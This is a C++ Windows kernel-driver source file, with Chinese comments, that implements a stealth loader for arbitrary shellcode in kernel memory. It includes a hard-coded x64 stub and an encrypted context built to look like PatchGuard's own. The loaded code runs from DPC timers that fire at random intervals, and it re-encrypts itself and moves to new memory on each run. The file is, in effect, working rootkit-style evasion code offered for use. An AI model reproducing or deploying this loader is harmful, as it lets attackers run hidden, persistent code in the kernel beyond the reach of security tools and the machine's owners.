#include "stdafx.h"
#include "shellcode.loader.h"

EXTERN_C void shellcode_retn();
extern "C"
{
	static void EncryptShellContext(PVOID shellContext, ULONG64 Key);
	static void EncryptShellCode(PVOID shellContext);
	static KDEFERRED_ROUTINE scTimer;
	void shellcode_api(PVOID Context, DWORD64 Key, DWORD64 v1, DWORD64 v2);
	using pfn_shellcode = decltype(&shellcode_api);
#pragma region Context code that cannot reference any exports directly
#pragma optimize("", off)
#pragma check_stack(off)
#pragma runtime_checks("", off)
	_Use_decl_annotations_ static void EncryptShellContext(PVOID shellContext, ULONG64 Key)
	{
		auto XorKey = Key;
		auto DecryptedContext = reinterpret_cast<ddk::shellcode::PSHELL_CONTEXT>(shellContext);
		const auto scContextSize = DecryptedContext->ContextSizeInQWord;
		auto scContext = reinterpret_cast<ULONG64*>(shellContext);
		static const auto NUMBER_OF_TIMES_TO_ENCRYPT =
			FIELD_OFFSET(ddk::shellcode::_SHELL_CONTEXT, ExAcquireResourceSharedLite)
			/ sizeof(ULONG64);
		C_ASSERT(NUMBER_OF_TIMES_TO_ENCRYPT == 0x19);
		for (SIZE_T i = 0; i < NUMBER_OF_TIMES_TO_ENCRYPT; ++i)
		{
			scContext[i] ^= XorKey;
		}

		auto decryptionKey = XorKey;
		for (auto i = scContextSize; i; --i)
		{
			scContext[i + NUMBER_OF_TIMES_TO_ENCRYPT - 1] ^= decryptionKey;
			decryptionKey = _rotr64(decryptionKey, static_cast<UCHAR>(i));
		}
	}
	_Use_decl_annotations_ static void EncryptShellCode(PVOID shellContext)
	{
		//生成随机key并加密，生成新的timer
		LARGE_INTEGER Key = {};
		LARGE_INTEGER TimerTime = {};
		ULONG _Time = 0;
		ddk::shellcode::PSHELL_DPC pshellDpc = nullptr;
		PVOID timerCode = nullptr;
		ddk::shellcode::PSHELL_CONTEXT pNewContext = nullptr;
		auto DecryptedContext = reinterpret_cast<ddk::shellcode::PSHELL_CONTEXT>(shellContext);
		auto _KeCancelTimer = DecryptedContext->_KeCancelTimer;
		auto _ExFreePoolWitTag = DecryptedContext->_ExFreePoolWithTag;
		auto _ExAllocatePoolWithTag = DecryptedContext->_ExAllocatePoolWithTag;
		auto _RtlRandom = DecryptedContext->_RtlRandom;
		auto _KeInitializeDpc = DecryptedContext->_KeInitializeDpc;
		auto _KeSetTimer = DecryptedContext->_KeSetTimer;
		auto _KeInitializeTimer = DecryptedContext->_KeInitializeTimer;
		Key.u.LowPart = _RtlRandom(&DecryptedContext->_mySeed);
		Key.u.HighPart = _RtlRandom(&DecryptedContext->_mySeed);
		_Time = _RtlRandom(&DecryptedContext->_mySeed);
		_Time = _Time % 60 + 1;//秒？
		TimerTime.QuadPart = -10LL * 1000LL * 1000LL * _Time;
		pshellDpc = (ddk::shellcode::PSHELL_DPC)_ExAllocatePoolWithTag(NonPagedPool, sizeof(ddk::shellcode::SHELL_DPC), 'pgsc');
		if (pshellDpc)
		{
			SIZE_T Size = DecryptedContext->_sizeAll;
			auto newContext = _ExAllocatePoolWithTag(NonPagedPool, Size, 'pgsc');
			if (newContext)
			{
				DecryptedContext->_memcpy(newContext, shellContext, Size);
				pNewContext = reinterpret_cast<ddk::shellcode::PSHELL_CONTEXT>(newContext);
				auto wk = (PWORK_QUEUE_ITEM)&pNewContext->unknown3;
				wk->WorkerRoutine = (PWORKER_THREAD_ROUTINE)(DecryptedContext->_offset_shellcode + (DWORD64)newContext);
				wk->Parameter = newContext;
				wk->List.Flink = NULL;
				auto pShellCode = reinterpret_cast<PUCHAR>(DecryptedContext->_offset_shellcode + (DWORD64)newContext);
				*(DWORD64 *)(&pShellCode[3]) = (DWORD64)(DecryptedContext->_offset_EncryptShellCode + (DWORD64)newContext);
				pNewContext->_ScTimer = (PKDEFERRED_ROUTINE)(DecryptedContext->_offset_ScTimer + (DWORD64)newContext);
				pNewContext->_EncryptShellContext = (DWORD64)(DecryptedContext->_offset_EncryptShellContext + (DWORD64)newContext);
				pNewContext->_ShellDpc = pshellDpc;
				pNewContext->old_context = shellContext;
				(decltype(&EncryptShellContext)(DecryptedContext->_EncryptShellContext))(newContext, Key.QuadPart);
				if (DecryptedContext->_ShellDpc)
				{
					auto pScDpc = DecryptedContext->_ShellDpc;
					_KeSetTimer(&pScDpc->_Timer, TimerTime, NULL);
					_KeCancelTimer(&pScDpc->_Timer);
					_ExFreePoolWitTag(pScDpc, 'pgsc');
				}
				if (DecryptedContext->old_context)
					_ExFreePoolWitTag(DecryptedContext->old_context, 'pgsc');
				pshellDpc->Key = Key.QuadPart;
				auto pContext = (PVOID)((DWORD64)pNewContext ^ Key.QuadPart);
				_KeInitializeDpc(&pshellDpc->dpc, DecryptedContext->_ScTimer, pContext);
				_KeInitializeTimer(&pshellDpc->_Timer);
				_KeSetTimer(&pshellDpc->_Timer, TimerTime, &pshellDpc->dpc);
				return;
			}
			_ExFreePoolWitTag(pshellDpc, 'pgsc');
		}
	}

	_Use_decl_annotations_ static VOID scTimer(
		PKDPC Dpc,
		PVOID DeferredContext,
		PVOID SystemArgument1,
		PVOID SystemArgument2)
	{
		UNREFERENCED_PARAMETER(SystemArgument1);
		UNREFERENCED_PARAMETER(SystemArgument2);
		auto scDpc = reinterpret_cast<ddk::shellcode::PSHELL_DPC>(Dpc);

		auto scRoutine = (DWORD64)DeferredContext;
		auto shellctx = reinterpret_cast<PDWORD64>(scDpc->Key ^ scRoutine | 0xFFFFF80000000000ui64);
		if (shellctx)
		{
			auto scCtx = reinterpret_cast<ddk::shellcode::PSHELL_CONTEXT>(shellctx);
			auto key2 = *shellctx;
			key2 = key2 ^ 0x85131481131482Ei64;
			*(DWORD32 *)shellctx = 0x1131482E;
			auto pfn = (pfn_shellcode)shellctx;
			pfn((PVOID)shellctx, key2, 0, 0);

			//sc_loader::getInstance().release();
		}
	}
#pragma runtime_checks("", restore)
#pragma check_stack()
#pragma optimize("", on)
#pragma endregion
};

namespace ddk::shellcode
{
	unsigned char pg_shellcode[] =
	{
		0x2E, 0x48,
		0x31, 0x11, 0x48, 0x31, 0x51, 0x08, 0x48, 0x31, 0x51, 0x10,
		0x48, 0x31, 0x51, 0x18, 0x48, 0x31, 0x51, 0x20, 0x48, 0x31,
		0x51, 0x28, 0x48, 0x31, 0x51, 0x30, 0x48, 0x31, 0x51, 0x38,
		0x48, 0x31, 0x51, 0x40, 0x48, 0x31, 0x51, 0x48, 0x48, 0x31,
		0x51, 0x50, 0x48, 0x31, 0x51, 0x58, 0x48, 0x31, 0x51, 0x60,
		0x48, 0x31, 0x51, 0x68, 0x48, 0x31, 0x51, 0x70, 0x48, 0x31,
		0x51, 0x78, 0x48, 0x31, 0x91, 0x80, 0x00, 0x00, 0x00, 0x48,
		0x31, 0x91, 0x88, 0x00, 0x00, 0x00, 0x48, 0x31, 0x91, 0x90,
		0x00, 0x00, 0x00, 0x48, 0x31, 0x91, 0x98, 0x00, 0x00, 0x00,
		0x48, 0x31, 0x91, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x31, 0x91,
		0xA8, 0x00, 0x00, 0x00, 0x48, 0x31, 0x91, 0xB0, 0x00, 0x00,
		0x00, 0x48, 0x31, 0x91, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x31,
		0x91, 0xC0, 0x00, 0x00, 0x00, 0x31, 0x11, 0x48, 0x8B, 0xC2,
		0x48, 0x8B, 0xD1, 0x8B, 0x8A, 0xC4, 0x00, 0x00, 0x00, 0x48,
		0x31, 0x84, 0xCA, 0xC0, 0x00, 0x00, 0x00, 0x48, 0xD3, 0xC8,
		0xE2, 0xF3, 0x8B, 0x82, 0x88, 0x02, 0x00, 0x00, 0x48, 0x03,
		0xC2, 0x48, 0x83, 0xEC, 0x28, 0xFF, 0xD0, 0x48, 0x83, 0xC4,
		0x28, 0x4C, 0x8B, 0x80, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8D,
		0x88, 0x40, 0x02, 0x00, 0x00, 0xBA, 0x01, 0x00, 0x00, 0x00,
		0x41, 0xFF, 0xE0
	};
	const auto shellcode_alloc_size = 0x100000ul;
	

	bool run_shellcode(PVOID _shellcode, size_t _shellcode_size)
	{
		
		size_t code_size = PAGE_SIZE * 3;
		//if (g_pDrvImageBase &&g_DrvImageSize)
		//{
		//	code_size = g_DrvImageSize;
		//}
		size_t allsize = shellcode_alloc_size;
		if (_shellcode_size + code_size + sizeof(_SHELL_CONTEXT) > shellcode_alloc_size)
		{
			allsize += _shellcode_size + code_size + sizeof(_SHELL_CONTEXT);
		}
		allsize = ddk::util::AlignSize(allsize, sizeof(DWORD64));
		auto pMem = ExAllocatePoolWithTag(NonPagedPool, allsize, 'pgsc');
		auto exit1 = std::experimental::make_scope_exit([&]() {
			if (pMem)
			{
				ExFreePoolWithTag(pMem, 'pgsc');
			}
		});
		if (!pMem)
		{
			return false;
		}
		RtlZeroMemory(pMem, allsize);
		auto pShellCode = reinterpret_cast<PUCHAR>(pMem);
		pShellCode += sizeof(ShellContext);
		auto pShellCodeContext = reinterpret_cast<PSHELL_CONTEXT>(pMem);
		pShellCodeContext->_sizeAll = allsize;
		RtlCopyMemory(pShellCodeContext->CmpAppendDllSection, pg_shellcode, sizeof(pg_shellcode));
		RtlCopyMemory(pShellCodeContext->retn, (PVOID)shellcode_retn, 0x10);
		RtlCopyMemory(pShellCode, _shellcode, _shellcode_size);
		auto offset_EncryptShellContext = (DWORD64)(sizeof(ShellContext) + _shellcode_size);
		auto offset_EncryptShellCode = (DWORD64)(sizeof(ShellContext) + _shellcode_size + PAGE_SIZE);
		auto offset_ScTimer = (DWORD64)(sizeof(ShellContext) + _shellcode_size + PAGE_SIZE * 2);
		/*if (g_pDrvImageBase &&g_DrvImageSize)
		{
			RtlCopyMemory(pShellCode + _shellcode_size, (PVOID)g_pDrvImageBase, g_DrvImageSize);
			offset_EncryptShellContext = (DWORD64)((DWORD64)EncryptShellContext - (DWORD64)g_pDrvImageBase + _shellcode_size);
			offset_EncryptShellCode = (DWORD64)((DWORD64)EncryptShellCode - (DWORD64)g_pDrvImageBase + _shellcode_size);
			offset_ScTimer = (DWORD64)((DWORD64)scTimer - (DWORD64)g_pDrvImageBase + _shellcode_size);
		}
		else*/
		{
			RtlCopyMemory(pShellCode + _shellcode_size, (PVOID)EncryptShellContext, PAGE_SIZE);
			RtlCopyMemory(pShellCode + _shellcode_size + PAGE_SIZE, (PVOID)EncryptShellCode, PAGE_SIZE);
			RtlCopyMemory(pShellCode + _shellcode_size + PAGE_SIZE * 2, (PVOID)scTimer, PAGE_SIZE);
		}
		//设置jmp回来的地方
		pShellCodeContext->_TimerSize = PAGE_SIZE;
		pShellCodeContext->_offset_ScTimer = offset_ScTimer;
		pShellCodeContext->_offset_shellcode = sizeof(ShellContext);
		pShellCodeContext->_offset_EncryptShellCode = offset_EncryptShellCode;
		pShellCodeContext->_offset_EncryptShellContext = offset_EncryptShellContext;
		*(DWORD64 *)(&pShellCode[3]) = (DWORD64)(offset_EncryptShellCode + (DWORD64)pShellCodeContext);
		*(DWORD64 *)(&pShellCode[3 + 8]) = *(DWORD64 *)EncryptShellCode;
		pShellCodeContext->_EncryptShellContext = (DWORD64)(offset_EncryptShellContext + (DWORD64)pShellCodeContext);
		pShellCodeContext->_ScTimer = (decltype(&scTimer))(offset_ScTimer + (DWORD64)pShellCodeContext);
		pShellCodeContext->_ShellDpc = nullptr;
		pShellCodeContext->_mySeed = (ULONG)__rdtsc();
		//我觉得完全鸡巴ok
		auto wk = (PWORK_QUEUE_ITEM)&pShellCodeContext->unknown3;
		ExInitializeWorkItem(wk, (PWORKER_THREAD_ROUTINE)pShellCode, pMem);
		pShellCodeContext->offsetToPg_SelfValidation = ULONG32((ULONG64)pShellCodeContext->retn - (ULONG64)pShellCodeContext);
		pShellCodeContext->ContextSizeInQWord = (ULONG32)((allsize - FIELD_OFFSET(ShellContext, ExAcquireResourceSharedLite)) / sizeof(DWORD64));
		//////////////////////////////////////////////////////////////////////////
		pShellCodeContext->ExAcquireResourceSharedLite = ddk::util::nt_syscall::getInstance().get<ULONG64>("ExAcquireResourceSharedLite");
		pShellCodeContext->ExFreePool = ddk::util::nt_syscall::getInstance().get<ULONG64>("ExFreePool");
		pShellCodeContext->ExMapHandleToPointer = ddk::util::nt_syscall::getInstance().get<ULONG64>("ExMapHandleToPointer");
		pShellCodeContext->ExQueueWorkItem = ddk::util::nt_syscall::getInstance().get<ULONG64>("ExQueueWorkItem");
		pShellCodeContext->ExReleaseResourceLite = ddk::util::nt_syscall::getInstance().get<ULONG64>("ExReleaseResourceLite");
		pShellCodeContext->ExUnlockHandleTableEntry = ddk::util::nt_syscall::getInstance().get<ULONG64>("ExUnlockHandleTableEntry");
		pShellCodeContext->ExfAcquirePushLockExclusive = ddk::util::nt_syscall::getInstance().get<ULONG64>("ExfAcquirePushLockExclusive");
		pShellCodeContext->ExfReleasePushLockExclusive = ddk::util::nt_syscall::getInstance().get<ULONG64>("ExfReleasePushLockExclusive");
		pShellCodeContext->KeAcquireInStackQueuedSpinLockAtDpcLevel = ddk::util::nt_syscall::getInstance().get<ULONG64>("KeAcquireInStackQueuedSpinLockAtDpcLevel");
		pShellCodeContext->ExAcquireSpinLockShared = ddk::util::nt_syscall::getInstance().get<ULONG64>("ExAcquireSpinLockShared");
		pShellCodeContext->KeBugCheckEx = ddk::util::nt_syscall::getInstance().get<ULONG64>("KeBugCheckEx");
		pShellCodeContext->KeDelayExecutionThread = ddk::util::nt_syscall::getInstance().get<ULONG64>("KeDelayExecutionThread");
		pShellCodeContext->KeEnterCriticalRegionThread = ddk::util::nt_syscall::getInstance().get<ULONG64>("KeEnterCriticalRegionThread");
		pShellCodeContext->KeLeaveCriticalRegion = ddk::util::nt_syscall::getInstance().get<ULONG64>("KeLeaveCriticalRegion");
		pShellCodeContext->KeEnterGuardedRegion = ddk::util::nt_syscall::getInstance().get<ULONG64>("KeEnterGuardedRegion");
		pShellCodeContext->KeLeaveGuardedRegion = ddk::util::nt_syscall::getInstance().get<ULONG64>("KeLeaveGuardedRegion");
		pShellCodeContext->KeReleaseInStackQueuedSpinLockFromDpcLevel = ddk::util::nt_syscall::getInstance().get<ULONG64>("KeReleaseInStackQueuedSpinLockFromDpcLevel");
		pShellCodeContext->ExReleaseSpinLockShared = ddk::util::nt_syscall::getInstance().get<ULONG64>("ExReleaseSpinLockShared");
		pShellCodeContext->KeRevertToUserAffinityThread = ddk::util::nt_syscall::getInstance().get<ULONG64>("KeRevertToUserAffinityThread");
		pShellCodeContext->KeProcessorGroupAffinity = ddk::util::nt_syscall::getInstance().get<ULONG64>("KeProcessorGroupAffinity");
		pShellCodeContext->KeSetSystemGroupAffinityThread = ddk::util::nt_syscall::getInstance().get<ULONG64>("KeSetSystemGroupAffinityThread");
		pShellCodeContext->LdrResFindResource = ddk::util::nt_syscall::getInstance().get<ULONG64>("LdrResFindResource");
		pShellCodeContext->ObfDereferenceObject = ddk::util::nt_syscall::getInstance().get<ULONG64>("ObfDereferenceObject");
		pShellCodeContext->ObReferenceObjectByName = ddk::util::nt_syscall::getInstance().get<ULONG64>("ObReferenceObjectByName");
		pShellCodeContext->RtlAssert = ddk::util::nt_syscall::getInstance().get<ULONG64>("RtlAssert");
		//填充我们自己的代码
		pShellCodeContext->_KeSetTimer = ddk::util::nt_syscall::getInstance().get<decltype(&KeSetTimer)>("KeSetTimer");
		pShellCodeContext->_KeCancelTimer = ddk::util::nt_syscall::getInstance().get<decltype(&KeCancelTimer)>("KeCancelTimer");
		pShellCodeContext->_ExFreePoolWithTag = ddk::util::nt_syscall::getInstance().get<decltype(&ExFreePoolWithTag)>("ExFreePoolWithTag");
		pShellCodeContext->_KeInitializeDpc = ddk::util::nt_syscall::getInstance().get<decltype(&KeInitializeDpc)>("KeInitializeDpc");
		pShellCodeContext->_KeInitializeTimer = ddk::util::nt_syscall::getInstance().get<decltype(&KeInitializeTimer)>("KeInitializeTimer");
		pShellCodeContext->_ExAllocatePoolWithTag = ddk::util::nt_syscall::getInstance().get<decltype(&ExAllocatePoolWithTag)>("ExAllocatePoolWithTag");
		pShellCodeContext->_memcpy = ddk::util::nt_syscall::getInstance().get<decltype(&memcpy)>("memcpy");
		pShellCodeContext->_RtlRandom = ddk::util::nt_syscall::getInstance().get<decltype(&RtlRandom)>("RtlRandom");
		LARGE_INTEGER Key = {};
		LARGE_INTEGER TimerTime = {};
		Key.u.LowPart = RtlRandom(&pShellCodeContext->_mySeed);
		Key.u.HighPart = RtlRandom(&pShellCodeContext->_mySeed);
		TimerTime.QuadPart = -ddk::util::seconds(5);
		auto pshellDpc = (PSHELL_DPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(SHELL_DPC), 'pgsc');
		if (!pshellDpc)
		{
			return false;
		}
		auto exit2 = std::experimental::make_scope_exit([&]() {
			ExFreePoolWithTag(pshellDpc, 'pgsc');
		});
		pShellCodeContext->_ShellDpc = pshellDpc;
		pShellCodeContext->old_context = nullptr;
		auto ScTimerFirst = ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, 'pgsc');
		if (!ScTimerFirst)
		{
			return false;
		}
		RtlCopyMemory(ScTimerFirst, scTimer, PAGE_SIZE);
		pShellCodeContext->old_context = ScTimerFirst;
		EncryptShellContext(pShellCodeContext, Key.QuadPart);
		pshellDpc->Key = Key.QuadPart;
		auto pContext = (PVOID)((DWORD64)pShellCodeContext ^ Key.QuadPart);
		KeInitializeDpc(&pshellDpc->dpc, (PKDEFERRED_ROUTINE)ScTimerFirst, pContext);
		KeInitializeTimer(&pshellDpc->_Timer);
		KeSetTimer(&pshellDpc->_Timer, TimerTime, &pshellDpc->dpc);
		exit2.release();
		exit1.release();
		return true;
	}
}